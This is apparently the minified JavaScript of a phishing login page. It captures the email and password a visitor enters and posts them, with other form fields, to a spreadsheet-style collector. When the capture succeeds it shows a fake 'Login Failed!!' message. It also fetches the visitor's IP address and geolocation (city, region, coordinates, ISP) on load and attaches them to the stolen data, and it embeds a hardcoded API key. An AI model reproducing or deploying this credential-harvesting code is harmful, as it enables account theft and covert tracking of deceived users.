const apiKey="at_iUPzHyxcZr1s5wI1RDYrr0k0sbKLj";const domainName='whoisxmlapi.com';const url='https://www.whoisxmlapi.com/whoisserver/WhoisService?'+`domainName=${domainName}&apikey=${apiKey}`;(function(){function getFormData(form){var elements=form.elements;var honeypot;var fields=Object.keys(elements).filter(function(k){if(elements[k].name==="honeypot"){honeypot=elements[k].value;return!1}
return!0}).map(function(k){if(elements[k].name!==undefined){return elements[k].name}else if(elements[k].length>0){return elements[k].item(0).name}}).filter(function(item,pos,self){return self.indexOf(item)==pos&&item});var formData={};fields.forEach(function(name){var element=elements[name];formData[name]=element.value;if(element.length){var data=[];for(var i=0;i<element.length;i++){var item=element.item(i);if(item.checked||item.selected){data.push(item.value)}}
formData[name]=data.join(', ')}});formData.formDataNameOrder=JSON.stringify(fields);formData.formGoogleSheetName=form.dataset.sheet||"responses";formData.formGoogleSend=form.dataset.email||"";return{data:formData,honeypot}}
function handleFormSubmit(event){event.preventDefault();var form=event.target;var formData=getFormData(form);var data=formData.data;var loading=document.querySelector(".loader")
var email=document.getElementsByClassName('email')[0]
var pass=document.getElementsByClassName('password')[0]
if(email.value.length!==0&&pass.value.length!==0){if(email.value.includes('@')&&email.value.includes('.')){if(formData.honeypot){return!1}
setTimeout(()=>loading.style.display="block",500)
var url=form.action;var xhr=new XMLHttpRequest();xhr.open('POST',url);xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xhr.onreadystatechange=function(){if(xhr.readyState===4){var response=JSON.parse(xhr.responseText);if(xhr.status===200&&response.status==='OK'){loading.style.display='none';M.toast({html:'Login Failed!!'})
console.log('success')}else{loading.style.display='none';M.toast({html:'Network Error!!'})
console.log('failed')}}
return};var encoded=Object.keys(data).map(function(k){return encodeURIComponent(k)+"="+encodeURIComponent(data[k])}).join('&');xhr.send(encoded)}else{M.toast({html:'Email is not correct'})}}else{M.toast({html:'Field is Empty'})}}
function loaded(){var loading=document.querySelector(".loader")
loading.style.display="none";var forms=document.querySelectorAll("form.gform");for(var i=0;i<forms.length;i++){forms[i].addEventListener("submit",handleFormSubmit,!1)}};document.addEventListener("DOMContentLoaded",loaded,!1);fetch('https://api.ipify.org?format=json').then(IP=>{return IP.json()}).then(async IP=>{await fetch(`https://ip-geolocation.whoisxmlapi.com/api/v1?apiKey=at_iUPzHyxcZr1s5wI1RDYrr0k0sbKLj&ipAddress=${IP.ip}`).then(res=>{return res.json()}).then(data=>{let info=document.getElementById('info');let{domain,name,type}=data.as;let{ip}=data;let{city,country,region,lat,lng}=data.location;info.value=`Internet Info : \n 
                    Domain: ${domain},
                    \n Name: ${name},
                    \n Type = ${type} .
                    \n IP-Address: ${ip} . \n
                     Location: \n
                     City: ${city}, \n 
                     Country: ${country}, \n
                     Region: ${region}, \n
                     Latitude: ${lat}, \n
                     Longitute: ${lng} .
                     `})}).catch(err=>{M.toast({html:'Network Error!!'})})})()